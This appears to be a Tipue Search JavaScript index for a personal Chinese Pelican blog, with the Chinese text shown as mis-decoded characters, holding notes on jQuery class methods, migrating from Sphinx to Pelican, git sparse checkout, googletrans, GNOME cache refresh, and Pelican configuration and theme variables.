var tipuesearch = {"pages":[{"title":"jQueryæä¾›æ–¹æ³•","text":"toggleClass() å¯¹é€‰æ‹©å…ƒç´ æ·»åŠ æˆ–ç§»é™¤æŒ‡å®šçš„ç±». è¯­æ³• $ ( selector ). toggleClass ( classname , function ( index , currentclass ), switch ) å‚æ•°è¯´æ˜ classname å¿…éœ€ã€‚è§„å®šæ·»åŠ æˆ–ç§»é™¤çš„ä¸€ä¸ªæˆ–å¤šä¸ªç±»åã€‚å¦‚éœ€è§„å®šè‹¥å¹²ä¸ªç±»ï¼Œè¯·ä½¿ç”¨ç©ºæ ¼åˆ†éš”ç±»åã€‚ function(index,currentclass) å¯é€‰ã€‚è§„å®šè¿”å›éœ€è¦æ·»åŠ /åˆ é™¤çš„ä¸€ä¸ªæˆ–å¤šä¸ªç±»åçš„å‡½æ•°ã€‚ index - è¿”å›é›†åˆä¸­å…ƒç´ çš„ index ä½ç½®ã€‚ currentclass - è¿”å›è¢«é€‰å…ƒç´ çš„å½“å‰ç±»åã€‚ switch å¯é€‰ã€‚å¸ƒå°”å€¼ï¼Œè§„å®šæ˜¯å¦ä»…ä»…æ·»åŠ ï¼ˆtrueï¼‰æˆ–ç§»é™¤ï¼ˆfalseï¼‰ç±»ã€‚ å¦‚ $ ( \"button\" ). click ( function (){ $ ( \"p\" ). toggleClass ( \"main\" ); }); å½“ç‚¹å‡»æ—¶, å¦‚æœ p æ ‡ç­¾çš„ç±»å±æ€§åŒ…å« main , åˆ™ç§»é™¤ p æ ‡ç­¾çš„ç±»å±æ€§ä¸åŒ…å« main , åˆ™æ·»åŠ  hasClass() åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŸä¸ªç±», è¿”å›boolå€¼ è¯­æ³• $ ( selector ). hasClass ( classname ) å‚æ•° classname å¿…éœ€ã€‚è§„å®šéœ€è¦åœ¨è¢«é€‰å…ƒç´ ä¸­æŸ¥æ‰¾çš„ç±»ã€‚ å¦‚ $ ( \"button\" ). click ( function (){ alert ( $ ( \"p\" ). hasClass ( \"intro\" )); });","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-jquery-jQuery-provided-methods.html","loc":"/yq-doc-source-docs-front-end-frame-jquery-jQuery-provided-methods.html"},{"title":"è®°å½•å°†sphinxæ–‡æ¡£åº“è¿ç§»åˆ°pelican","text":"æ­¤å‰ä¸€ç›´ç”¨çš„sphinx, é€‚åˆåšæ–‡æ¡£æ•™ç¨‹, ä¸€ç›´å†™äº†å‡ å¹´ä¸ªäººæ–‡æ¡£. è¿›æ¥è§‰å¾—è¿™äº›è®°å½•ä¸é€‚åˆåšæˆæ–‡æ¡£æ•™ç¨‹, æƒ³æ”¹æˆåšå®¢, å°±æœ‰äº†ä»¥ä¸‹... å‰è·¯å†ç¨‹ sphinxç›´æ¥åšæˆåšå®¢æ–¹æ¡ˆ æ‰¾äº†å¾ˆä¹…è¿™ä¸ª, åé¢æ‰¾åˆ°ä¸€ä¸ª ablog æ‹“å±•, å¯ä»¥ç›´æ¥é…ç½®åœ¨ sphinx çš„ conf.py. ä½†æ˜¯ç”±äºæ˜¯åŸºäº sphinx çš„ä¸»é¢˜, æ‰€ä»¥åç»­ä¿®æ”¹ä¸»é¢˜æ¯”è¾ƒéº»çƒ¦. ä¸”å†…å®¹è¾ƒå¤§æ—¶, ç”Ÿæˆé€Ÿåº¦ç®€ç›´ç¼“æ…¢(sphinxæœ¬èº«çš„æ…¢). å†åŠ ä¸Šåšå®¢æœ¬èº«ä¸éœ€è¦sphinxå†…ç½®çš„æ–‡æ¡£ç»“æ„ç”Ÿæˆ. æ•…åé¢å°±æ”¾å¼ƒäº† ablog . ç®€å•æœç´¢äº†ä¸‹åšå®¢æ¡†æ¶, æœ€åè¿˜æ˜¯é€‰æ‹©äº† pelican pelicanæ²¡æœ‰sphinxçš„ä¸“æœ‰æŒ‡ä»¤/è§’è‰² è¿™ä¸ªé—®é¢˜ä¸€ç›´å›°æ‰°äº†å¾ˆä¹…, å› ä¸ºæ­¤å‰ä¸€ç›´ç”¨çš„ sphinx , æ‰€ä»¥æƒ³å½“ç„¶è®¤ä¸ºåƒ toctree , literalinclude ç­‰æŒ‡ä»¤, doc , ref ç­‰ role æ˜¯ rst æœ¬èº«å°±æ”¯æŒçš„. ç›´åˆ°æˆ‘æ„å»ºçš„æ—¶å€™, çœ‹æŠ¥é”™æ‰çŸ¥é“å¹¶éå¦‚æ­¤. githubä¸Šçœ‹äº†ä¸‹, å¯èƒ½æ˜¯ä¹‹å‰æ²¡äººæœ‰è¿™æ ·çš„å†ç¨‹å§, å‹æ ¹æ²¡æœ‰ç°æœ‰è§£å†³æ–¹æ¡ˆ. æœ€å, è‡ªå·±æŠŠè‡ªå·±æ–‡æ¡£é‡åˆ°çš„å†…å®¹, ç®€å•é€šè¿‡ pelican æ’ä»¶å¤„ç†äº†ä¸€ä¸‹, è‡³äºå…·ä½“å®ç°æœ¬èº«åŠŸèƒ½, å…ˆè¿™æ ·å¼„, åé¢æ…¢æ…¢æ¥. pelicanæ„å»ºæ—¶æ¨¡ç‰ˆç¿»è¯‘æ”¯æŒ è¿™ä¸ªä¹Ÿç®—æ˜¯ä¸€ä¸ªç—›ç‚¹, æ¨¡ç‰ˆæ˜¯ç”¨çš„ Jinja æ¨¡ç‰ˆå¼•æ“. æ­¤å‰è™½ç„¶ç”¨è¿‡, ä½†æ²¡æœ‰ç³»ç»Ÿæè¿‡, æ‰€ä»¥å®Œå…¨ä¸çŸ¥é“å›½é™…åŒ–è¿˜éœ€è¦å®‰è£…æ’ä»¶. ä¹‹é“é‡åˆ°æŠ¥é”™: _ undeifned åé¢çš„è§£å†³æ–¹æ¡ˆæ˜¯. å®‰è£… jinja2 çš„å¿…é¡»æ’ä»¶ pip install jinja2-pluralize-extension åœ¨ pelicanconf.py ä¸­é…ç½®å¤šè¯­è¨€æ’ä»¶ PLUGIN_PATHS = [ \"plugins\" ] PLUGINS = [ \"i18n_subsites\" , # å¤šè¯­è¨€ ] i18n_subsites å¯ä»¥åœ¨å®˜æ–¹githubä»“åº“ä¸‹è½½, åœ°å€: pelican-plugins/i18n_subsites vscodeæ²¡æœ‰çº¯ç²¹çš„æŒ‡ä»¤è”æƒ³æ’ä»¶ æœ‰ä¸ª rst å®˜æ–¹æ’ä»¶, ä¸è¿‡æ˜¯ä¾èµ–sphinxçš„. è®¡åˆ’åé¢å†™åˆ°vscodeæ‹“å±•æ”¯æŒ... æœç´¢åŠŸèƒ½ çœ‹äº†ä¸‹å…¶ä»–ä¸»é¢˜æœ‰æœç´¢çš„æ˜¯ç”¨çš„ tipue search ç„¶åå°±åŠ äº†è¿™ä¸ªæ’ä»¶, ä¹Ÿåœ¨å®˜æ–¹ä»“åº“ä¸‹è½½ PLUGINS = [ \"i18n_subsites\" , # å¤šè¯­è¨€ \"tipue_search\" , ] æ’ä»¶githubåœ°å€: https://github.com/pelican-plugins/tipue-search ç„¶åè¿˜è¦é…ç½®jsè·Ÿç›¸åº”çš„css. ä¸€å¼€å§‹æˆ‘ç›´æ¥æŠŠåˆ«äººè€ä»“åº“çš„jsæ‹¿è¿‡æ¥, æ”¹å¥½ä¸»é¢˜å, å‘ç°ä¸æ”¯æŒä¸­æ–‡æœç´¢. å…·ä½“ç ”ç©¶äº†ä¸‹, å‘ç°æ‹¿è¿‡æ¥çš„æ˜¯ 3.0 çš„ç‰ˆæœ¬, è¦ç”¨æœ€æ–°çš„ 5.1 æ‰è¡Œ, äºæ˜¯åˆå»ä¸‹å¥½æœ€æ–°ç‰ˆ, ä¿®ä¿®æ”¹æ”¹, ç»ˆäºæ”¯æŒäº† ä¸­æ–‡æœç´¢ å¯å‚è€ƒä¸‹è½½åœ°å€: https://cdnjs.com/libraries/Tipue-Search å›¾æ ‡ æœ‰äº›æ ·å¼æ¯”å¦‚å›¾æ ‡æ²¡æ³•ç”¨åŸç”Ÿhtmlå®ç°, åé¢æ‰¾åˆ°ä¸ª fontawesome å›¾æ ‡åº“, ä½†æ˜¯å…¨éƒ¨å¼•å…¥æ„Ÿè§‰æ²¡å¿…è¦, å› ä¸ºæˆ‘å°±ç”¨é‚£ä¹ˆå‡ ä¸ª. æœ€åçš„æªæ–½æ˜¯: åœ¨ fontawesome æ‰¾å¥½æƒ³è¦çš„å›¾æ ‡ æ”¹ä¸‹å›¾æ ‡æ ·å¼ å¤åˆ¶å›¾æ ‡çš„ svg, ä¿å­˜åˆ°æœ¬åœ°ä¸ºå›¾ç‰‡ä½¿ç”¨. å¦å¤–æ‰¾æœç´¢å›¾æ ‡çš„æ—¶å€™çœ‹åˆ° ç”¨contentæ¥æ˜¾ç¤ºç‰¹æ®Šå›¾ç‰‡çš„, ä¸è¿‡éœ€è¦å­—ä½“æ”¯æŒ, å¯å‚è€ƒ: https://www.cnblogs.com/ninama/p/16019777.html ç¼ºå¤±æºä¿¡æ¯ ä¸»è¦å°±æ˜¯ ä½œè€…, äº‹ä»¶, è·¯å¾„ ç­‰ä¿¡æ¯. æœ¬æ¥æƒ³çœ‹çœ‹æ–‡ä»¶çš„mktime, ä½†æ˜¯å‘ç°å¯èƒ½æ˜¯è·Ÿgitäº¤äº’çš„åŸå› å§, æœ‰gitçš„åŒæ­¥å•¥çš„è²Œä¼¼ä¼šé‡æ–°è®¡ç®—mk. ä½†æ˜¯æš‚æ—¶ä¹Ÿæ‰¾ä¸åˆ°å…¶ä»–æ–¹æ³•, å°±æš‚æ—¶åªå¥½ç”¨é”™è¯¯çš„mktimeäº†. å…¶ä»–ä¿¡æ¯å†™äº†ä¸ªè„šæœ¬æ¥å…¨éƒ¨åŠ . ç¼–å†™rstæ–‡æ¡£æ—¶ç¼ºå°‘æŒ‡ä»¤æç¤º å› ä¸ºç¼–å†™æ—¶å€™æ˜¯åœ¨pelicané¡¹ç›®, æ‰€ä»¥éœ€è¦ç¦ç”¨ sphinx çš„è¯­è¨€æœåŠ¡å™¨ esbonio \"esbonio.server.enabled\" : false ç„¶åå‘ç°ç”¨ä¸äº†æŒ‡ä»¤æç¤º, ä¸»è¦æ˜¯ docutil ç›¸å…³çš„. åŠ ä¹‹æœ‰æ—¶å€™æ‰‹æ‰“çš„å¯èƒ½æœ‰æ‹¼å†™é”™è¯¯, å°±æ‰“ç®—ç ”ç©¶ç ”ç©¶è‡ªå®šä¹‰ä¸ªçº¯ç²¹çš„æŒ‡ä»¤æç¤ºæ’ä»¶. with long time... ç›´åˆ°å‡†å¤‡å†™ç›¸å…³æ’ä»¶, å»çœ‹ rst æ€ä¹ˆå®ç°çš„æ—¶å€™, å‘ç° reStructuredText æ’ä»¶çš„åŠŸèƒ½æ˜¯è¿™æ ·å†™çš„ { \"code\" : { \"prefix\" : \"code\" , \"body\" : \".. code-block:: ${1:language}\\n$0\" , \"description\" : \"Code\" , \"scope\" : \"source.rst\" }, \"image\" : { \"prefix\" : \"image\" , \"body\" : \".. image:: ${1:path}\\n$0\" , \"description\" : \"Image\" , \"scope\" : \"source.rst\" }, \"figure\" : { \"prefix\" : \"figure\" , \"body\" : \".. figure:: ${1:path}\\n\\n $0\" , \"description\" : \"Figure\" , \"scope\" : \"source.rst\" }, ... å¥½å§, æ˜¯æˆ‘ç”¨ .. å¼€å§‹çš„è§¦å‘æ–¹å¼é”™è¯¯. æ³¨è§£ æ­¤å‰ç”¨ .. èƒ½è§¦å‘æˆåŠŸ, æ˜¯å› ä¸º esbonio æœåŠ¡å™¨æ‰¾çš„æ˜¯ docutil ç›¸å…³çš„æç¤º(å³ä½¿ esbonio æ²¡å¯èµ·æ¥). æˆ‘æ˜¯è§‰å¾—, pelican ä¸éœ€è¦å®ƒä¸”è€ä¼šè‡ªåŠ¨è§¦å‘æ„å»ºåˆæ²¡æ³•æˆåŠŸ, æ‰€ä»¥ç»™å…³äº†","tags":"æ–‡æ¡£","url":"/yq-doc-do-from-sp-to-pelican.html","loc":"/yq-doc-do-from-sp-to-pelican.html"},{"title":"ä»…å…‹éš†æŒ‡å®šæ–‡ä»¶å¤¹","text":"æœ‰æ—¶å€™æƒ³å…‹éš†æŸä¸ªä»“åº“çš„æŒ‡å®šçš„æ–‡ä»¶å¤¹, è€Œéæ•´ä¸ªä»“åº“ ä½œä¸ºä¸»æ¨¡å— å°±æ˜¯ä¸ä¼šè¢«å…¶ä»–ä»“åº“ä½œä¸ºå­ä»“åº“ä½¿ç”¨ åˆ›å»ºä¸€ä¸ªä¸è¦cloneçš„ä»“åº“åŒåæˆ–ä¸åŒå‘½çš„ç›®å½•, ç„¶ååˆå§‹åŒ–ä»“åº“ mkdir content cd content git init æ·»åŠ è¿œç¨‹ä»“åº“æº git remote add origin git@xxx.git æœ€é‡è¦çš„ä¸€æ­¥æ¥äº†, è®¾ç½®Sparse Checkout ä¸ºtrue, æ‰èƒ½æ”¯æŒå•ç‹¬æ‹‰æ–‡ä»¶å¤¹ git config core.sparsecheckout true å°† æƒ³è¦å…‹éš†çš„æ–‡ä»¶å¤¹ ç›¸å¯¹ æ ¹ç›®å½• çš„è·¯å¾„å†™å…¥é…ç½®æ–‡ä»¶. æ¯”å¦‚sourceä¸‹ä¸¤ä¸ªdocs1å’Œdocs2æ–‡ä»¶å¤¹ echo \"source/docs\\nsource/docs2\" >> .git/info/sparse-checkout ç„¶åå†æ‹‰å³å¯ git pull origin master å¦‚æœåªæƒ³ä¿ç•™æœ€æ–°çš„æ–‡ä»¶è€Œä¸è¦å†å²ç‰ˆæœ¬çš„æ–‡ä»¶ï¼Œpullå¯ä»¥ç”¨git pull --dpeth 1å‘½ä»¤ï¼Œå³\"æµ…å…‹éš†\"ï¼š $ git pull --depth 1 origin master ä½œä¸ºå­æ¨¡å— å°±æ˜¯ä½œä¸ºå­ä»“åº“ä½¿ç”¨. ä¸ä¸Šé¢å·®è·ä¸å¤§. ä¸è¿‡ç”±äºè·¯å¾„åŸå› , éœ€è¦å…ˆè®¾ç½®å­ä»“åº“ åœ¨çˆ¶ä»“åº“è®¾ç½®å­ä»“åº“ git submodule add -b $branch_name -- git@xxx.git content è¿™ä¸ªåªæ˜¯ä¸ºäº†åŠ åˆ° .gitmodules , æ‰‹åŠ¨æ”¹çš„è¯, è²Œä¼¼æœ‰æ—¶å€™ä¼šæœ‰é—®é¢˜. æ‰€ä»¥ä½¿ç”¨å‘½ä»¤æ·»åŠ , ä¸è¿‡ä½¿ç”¨å‘½ä»¤æ·»åŠ å­ä»“åº“æ—¶, ä¼šé»˜è®¤æ‹‰å–æ‰€æœ‰ä¿¡æ¯. è¿™ä¸ªæ—¶å€™çš„ä¿¡æ¯æ˜¯å…¨é‡çš„. ä¸ä¸Šé¢ ä¸ä½œä¸ºå­ä»“åº“ ä¸åŒä¹‹å¤„å°±åœ¨è¿™, å…ˆè¿›ä»“åº“ç›®å½•, ç„¶åæ¸…ç©ºæ‰€æœ‰ å¦‚æœä»‹æ„è¿™ä¸€ç‚¹, å¯ä»¥ç ”ç©¶ç ”ç©¶ç›´æ¥æ‰‹åŠ¨å°†ä¿¡æ¯å¢åŠ åˆ° .gitmodules ä¼šä¸ä¼šæœ‰é—®é¢˜ åç»­æŒ‡ä»¤ git remote add origin git@xxx.git git config core.sparsecheckout true echo \"source/docs\\nsource/docs2\" >> .git/info/sparse-checkout git pull origin $branch_name core.sparsecheckoutä½œç”¨ æ”¯æŒ ç¨€ç–æ£€å‡º , å³ æœ¬åœ°ç‰ˆæœ¬åº“æ£€å‡ºæ—¶ä¸æ£€å‡ºå…¨éƒ¨ , åªå°†æŒ‡å®šçš„æ–‡ä»¶ä»æœ¬åœ°ç‰ˆæœ¬åº“æ£€å‡ºåˆ°å·¥ä½œåŒº å¯å‚è€ƒ: ç¨€ç–æ£€å‡ºå’Œæµ…å…‹éš†","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-issuses-clone-only-folder.html","loc":"/yq-doc-source-docs-version-control-git-issuses-clone-only-folder.html"},{"title":"googletrans","text":"ä¸€ä¸ªè°·æ­Œæä¾›çš„ç¿»è¯‘æ¨¡å—, åˆ†å¤šä¸ªç‰ˆæœ¬, å®é™…æµ‹è¯•å¯ç”¨çš„ç‰ˆæœ¬ä¸º 4.0.0-rc1 å®‰è£…: # pip install googletrans==3.1.0a0 pip install googletrans == 4 .0.0-rc1 ç®€å•çš„ç¿»è¯‘å®ç° translator = Translator () cache = {} def translate_from_ch_to_en ( text ) -> str : if text in cache : return cache [ text ] try : translation = translator . translate ( text , src = 'zh-CN' , dest = 'en' ) # return translation.text cache [ text ] = translation . text return cache [ text ] except Exception as e : print ( \"-0-0-\" , text , e ) raise e ä¸€äº›é¢„å®šä¹‰ googletrans.LANGUAGES æŸ¥çœ‹æ”¯æŒçš„è¯­è¨€ç§ç±»","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-googletrans.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-googletrans.html"},{"title":"gnomeåˆ·æ–°desktopç¼“å­˜","text":"æ­¤å‰ä¸€ç›´ä»¥ä¸º update-desktop-database å¯ä»¥ç›´æ¥åˆ·æ–°desktopç¼“å­˜, ç»“æœç”¨çš„æ—¶å€™ä¸€ç›´æ²¡æœ‰ç”Ÿæ•ˆ. å†ä»”ç»†çœ‹äº†ä¸€ä¸‹ update-desktop-database çš„æè¿°è¯´åˆ° æ„å»º MIME types çš„ç¼“å­˜æ•°æ®åº“. ä¸€å£è€è¡€. æˆªæ­¢ç›®å‰äº†è§£åˆ°åˆ·æ–°ç¼“å­˜çš„ä¸‰ç§æ–¹å¼: é‡å¯gnome å›¾å½¢åŒ–ç•Œé¢å¯ä»¥æŒ‰å¿«æ·é”® ALT + F2 , ç„¶åè¾“å…¥ restart é‡å¯ ç”¨æˆ·é‡æ–°ç™»é™† å³æ‰‹åŠ¨æ³¨é”€ç”¨æˆ·, å†é‡æ–°ç™»é™†, ç¼ºç‚¹å°±æ˜¯æ³¨é”€ä¼šå…³é—­ç”¨æˆ·å‰å°æ‰“å¼€ç¨‹åº é‡å¯ é‡äº‹ä¸å†³, ç›´æ¥é‡å¯","tags":"linux","url":"/yq-os-linux-ubuntu-issues.html","loc":"/yq-os-linux-ubuntu-issues.html"},{"title":"Vscodeæ–‡æ¡£ç›¸å…³æ’ä»¶.rst","text":"reStructuredText ç›¸å…³èµ„æº å®˜ç½‘æ–‡æ¡£: https://docs.restructuredtext.net æä¾›äº†åŸºäºSphinxçš„è¯­æ³•é¢„è§ˆæç¤ºç­‰æ”¯æŒ, ä½†æ˜¯ç¼ºç‚¹ä¹Ÿæ˜¯åªæ”¯æŒSphinx. æ¯”å¦‚å¦‚æœæˆ‘ç”¨pelicanåˆ›å»ºçš„å†…å®¹, å°±åªèƒ½åœ¨å·¥ç¨‹åŒº setting.json é…ç½®ä¸ª { \"esbonio.server.enabled\" : false } ç„¶åå°±åªèƒ½ç”¨ä½¿ç”¨ docutil é¢„è§ˆåŠŸèƒ½. Table Formatter è¡¨æ ¼å¿«æ·ç¼–å†™æ’ä»¶ è¿˜æ²¡ææ‡‚å’‹ç”¨","tags":"æ–‡æ¡£","url":"/yq-doc-vs-plugin.html","loc":"/yq-doc-vs-plugin.html"},{"title":"Xcodeæ˜¯å¦é…ç½®è¯ä¹¦çš„åŒºåˆ«","text":"å¦‚ æ–°ç‰ˆæœ¬çš„MacOSé™åˆ¶è¶Šæ¥è¶Šä¸¥æ ¼äº†, åªæœ‰é€‰æ‹©å¦‚å›¾çš„å¼€å‘è€…è¯ä¹¦ æ‰èƒ½åœ¨å…¶ä»–æœºå™¨è¿è¡Œ. å¦‚æœåªæ˜¯é€‰æ‹©äº† Run Local , åœ¨ä»¥å‰æ“ä½œä¸€ä¸‹è¿˜å¯ä»¥åœ¨å…¶ä»–æœºå™¨è·‘, ç°åœ¨ä¹Ÿä¸è¡Œäº†","tags":"åç«¯; swift","url":"/yq-backend-swift-xode-diff-with-or-no-cert.html","loc":"/yq-backend-swift-xode-diff-with-or-no-cert.html"},{"title":"é…ç½®é¡¹","text":"ä»…ä»‹ç»éƒ¨åˆ†, å…¨éƒ¨çš„å¯è§: è®¾ç½®é€‰é¡¹ EXTRA_PATH_METADATA é¢å¤–çš„é™æ€èµ„æºæ‹·è´è·¯å¾„ æ¯”å¦‚ç½‘ç«™åŠ å…¥favicon.ico # å°†extraæ–‡ä»¶å¤¹ä¸‹é¢çš„favicon.icoæ–‡ä»¶copyåˆ°outputæ–‡ä»¶å¤¹ä¸‹é¢ã€‚ EXTRA_PATH_METADATA = { 'extra/favicon.ico' : { 'path' : 'favicon.ico' } } DEFAULT_CATEGORY å½“ä¸æƒ³åœ¨åšå®¢é¡µæ˜¾ç¤ºå®šä¹‰åˆ†ç±»æ—¶, è®¾ç½®é»˜è®¤åˆ†ç±» DEFAULT_CATEGORY = 'others' USE_FOLDER_AS_CATEGORY æŒ‰ç…§æœ€è¿‘ä¸€å±‚æ–‡ä»¶å¤¹æ·»åŠ åˆ†ç±» ä¸èƒ½ä¸DEFAULT_CATEGORYå…±å­˜ USE_FOLDER_AS_CATEGORY = True DEFAULT_PAGINATION è®¾ç½®ä¸»é¡µåšå®¢åˆ†é¡µæ˜¾ç¤º å¦‚åˆ†æ¯é¡µæœ€å¤šæ˜¾ç¤º10æ¡åšå®¢è®°å½•. DEFAULT_PAGINATION = 10 å¦‚ä¸éœ€è¦åˆ†é¡µ, è®¾ç½®ä¸ºFalseå³å¯ å‚è€ƒ: pelican","tags":"æ–‡æ¡£","url":"/yq-doc-frame-pelican-conf.html","loc":"/yq-doc-frame-pelican-conf.html"},{"title":"ä¸»é¢˜æ¨¡ç‰ˆä¸å˜é‡","text":"ä¸»è¦å‚è€ƒ: https://pelican-docs-latest-cn.readthedocs.io/zh-cn/latest/themes.html ä¸»é¢˜æ¡†æ¶ å¿…é¡»éµå¾ªä»¥ä¸‹çš„æ–‡ä»¶ç»“æ„: â”œâ”€â”€ static â”‚ â”œâ”€â”€ css â”‚ â””â”€â”€ images â””â”€â”€ templates â”œâ”€â”€ archives.html // æ˜¾ç¤ºå­˜æ¡£ â”œâ”€â”€ period_archives.html // æ˜¾ç¤ºæ—¶é—´æ®µå­˜æ¡£ â”œâ”€â”€ article.html // åº”ç”¨äºæ¯ç¯‡æ–‡ç«  â”œâ”€â”€ author.html // åº”ç”¨äºæ¯ä¸ªä½œè€… â”œâ”€â”€ authors.html // åº”ç”¨äºæ‰€æœ‰ä½œè€… â”œâ”€â”€ categories.html // åˆ—å‡ºæ‰€æœ‰åˆ†ç±» â”œâ”€â”€ category.html // åº”ç”¨äºæ¯ä¸ªåˆ†ç±» â”œâ”€â”€ index.html // ç´¢å¼• (åˆ—å‡ºæ‰€æœ‰æ–‡ç« ) â”œâ”€â”€ page.html // åº”ç”¨äºæ¯ä¸ªpageé¡µ â”œâ”€â”€ tag.html // åº”ç”¨äºæ¯ä¸ªæ ‡ç­¾ â””â”€â”€ tags.html // åˆ—å‡ºæ‰€æœ‰æ ‡ç­¾ï¼Œå¯ä»¥æ˜¯æ ‡ç­¾äº‘ å…¶ä¸­, static åŒ…å«æ‰€æœ‰é™æ€èµ„æºï¼Œè¿™äº›é™æ€èµ„æºå°†è¢«å¤åˆ¶åˆ°è¾“å‡ºç›®å½•çš„ theme æ–‡ä»¶å¤¹ã€‚ ä¸Šè¿°æ–‡ä»¶ç³»ç»Ÿå¸ƒå±€ä¸­åŒ…æ‹¬CSSæ–‡ä»¶å¤¹å’Œå›¾åƒæ–‡ä»¶å¤¹ï¼Œä½†è¿™äº›åªæ˜¯ç¤ºä¾‹ã€‚æŠŠä½ éœ€è¦çš„æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ã€‚ templates åŒ…å«å°†ç”¨äºç”Ÿæˆå†…å®¹çš„æ‰€æœ‰æ¨¡æ¿ã€‚ä¸Šé¢åˆ—å‡ºçš„æ¨¡æ¿æ–‡ä»¶æ˜¯å¼ºåˆ¶æ€§çš„ï¼› åˆ›å»ºä¸»é¢˜æ—¶å¦‚æœæœ‰éœ€è¦ï¼Œä½ å¯ä»¥æ·»åŠ è‡ªå·±çš„æ¨¡æ¿æ–‡ä»¶ã€‚ æ¨¡æ¿å’Œå˜é‡ è‡ªå®šä¹‰å…¨å±€æ¨¡ç‰ˆå˜é‡ åªè¦è®¾ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„å˜é‡æ‹¼å†™å…¨å¤§å†™ï¼Œæ‰€æœ‰æ¨¡æ¿éƒ½å°†æ¥æ”¶å®ƒä»¬ã€‚ é¢„å®šä¹‰å…¨å±€æ¨¡ç‰ˆå˜é‡ æ‰€æœ‰è¿™äº›è®¾ç½®å°†é€‚ç”¨äºæ‰€æœ‰æ¨¡æ¿ã€‚ å˜é‡ æè¿° output_file å½“å‰æ­£åœ¨ç”Ÿæˆçš„æ–‡ä»¶çš„åç§°ã€‚ä¾‹å¦‚ï¼Œå½“pelicanæ¸²æŸ“ä¸»é¡µï¼Œè¾“ å‡ºæ–‡ä»¶output_fileå°†ä¸º \"index.html\" ã€‚ articles æ–‡ç« åˆ—è¡¨ï¼ŒæŒ‰æ—¥æœŸé™åºæ’åºã€‚ æ‰€æœ‰å…ƒç´ éƒ½æ˜¯ Article æ–‡ç«  å¯¹è±¡ï¼Œå› æ­¤ä½ å¯ä»¥è®¿é—®å®ƒä»¬çš„å±æ€§ï¼ˆä¾‹å¦‚æ ‡é¢˜ã€æ‘˜è¦ã€ä½œè€… ç­‰ï¼‰ã€‚æœ‰æ—¶è¿™äº›ä¿¡æ¯è¢«éšå»ï¼ˆæ¯”å¦‚åœ¨æ ‡ç­¾é¡µï¼‰ã€‚ä¸è¿‡ä½ å¯ä»¥åœ¨ æ‰€æœ‰æ–‡ç«  all_articles å˜é‡ä¸­æ‰¾åˆ°æœ‰å…³çš„ä¿¡æ¯ã€‚ dates åŒæ ·æ˜¯æ–‡ç« åˆ—è¡¨ï¼Œä¸è¿‡æŒ‰æ—¥æœŸå‡åºæ’åºã€‚ drafts æ–‡ç« è‰ç¨¿åˆ—è¡¨ã€‚ authors ä¸€ä¸ªå…ƒç»„tuplesï¼ˆä½œè€…ï¼Œæ–‡ç« ï¼‰åˆ—è¡¨ï¼ŒåŒ…å«æ‰€æœ‰ä½œè€…å’Œç›¸åº”çš„æ–‡ç« ï¼ˆå€¼ï¼‰ã€‚ categories ä¸€ä¸ªå…ƒç»„tuplesï¼ˆåˆ†ç±»ï¼Œæ–‡ç« ï¼‰åˆ—è¡¨ï¼ŒåŒ…å«æ‰€æœ‰åˆ†ç±»å’Œç›¸åº”çš„æ–‡ç« ï¼ˆå€¼ ï¼‰ã€‚ tags ä¸€ä¸ªå…ƒç»„tuplesï¼ˆæ ‡ç­¾ï¼Œæ–‡ç« ï¼‰åˆ—è¡¨ï¼ŒåŒ…å«æ‰€æœ‰æ ‡ç­¾å’Œç›¸åº”çš„æ–‡ç« ï¼ˆå€¼ ï¼‰ã€‚ pages pagesé¡µé¢åˆ—è¡¨ hidden_pages éšè—çš„pagesé¡µé¢åˆ—è¡¨ draft_pages pagesé¡µé¢è‰ç¨¿åˆ—è¡¨ æ’åº URLåŒ…è£…å™¨ï¼ˆå½“å‰ä¸ºåˆ†ç±»ã€æ ‡ç­¾å’Œä½œè€…ï¼‰ï¼Œå†…å«æ¯”è¾ƒæ–¹æ³•ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°æŒ‰åç§°æ’åº {% for tag , articles in tags | sort %} ç›¸å…³jinjaå‘½ä»¤å¯å‚è€ƒ https://jinja.palletsprojects.com/templates/#sort æ ¼å¼åŒ–æ—¥æœŸ å¯ä»¥ç›´æ¥è®¾ç½® DATE_FORMATS/DEFAULT_DATE_FORMAT ä»¥åŠ locale_date å±æ€§ä»¥ä¾›ä½ å¯¹æ—¥æœŸè¿›è¡Œæ ¼å¼åŒ–è®¾ç½® å¯ä»¥æ­¤æ ¼å¼åœ¨æ¨¡ç‰ˆä¸­çµæ´»ä½¿ç”¨ {{ article.date | strftime ( '%d %B %Y' ) }} æ¨¡æ¿é¡µindex.html ç”¨äºç”Ÿæˆåšå®¢ä¸»é¡µæˆ–ç´¢å¼•é¡µ index.html å¦‚æœåˆ†é¡µåŠŸèƒ½å¤„äºå¯ç”¨çŠ¶æ€ï¼Œåˆ™åç»­çš„é¡µé¢å°†ç±»ä¼¼ index{number}.html è¿™ç§å½¢å¼ã€‚ å˜é‡ æè¿° articles_paginator æ–‡ç« åˆ—è¡¨çš„åˆ†é¡µå¯¹è±¡ articles_page æ–‡ç« çš„å½“å‰é¡µç  articles_previous_page æ–‡ç« çš„å‰ä¸€é¡µ(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") articles_next_page æ–‡ç« çš„ä¸‹ä¸€é¡µ(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") dates_paginator æ–‡ç« åˆ—è¡¨çš„åˆ†é¡µå¯¹è±¡ï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº dates_page æ–‡ç« çš„å½“å‰é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åºã€‚ dates_previous_page æ–‡ç« çš„å‰ä¸€é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") dates_next_page æ–‡ç« çš„ä¸‹ä¸€é¡µï¼ŒæŒ‰æ—¥æœŸå‡åºæ’åº(å¦‚æœé¡µé¢ä¸å­˜åœ¨ï¼Œåˆ™ä¸º\"æ— \") page_name â€˜index' â€“ ç”¨äºåˆ†é¡µé“¾æ¥ 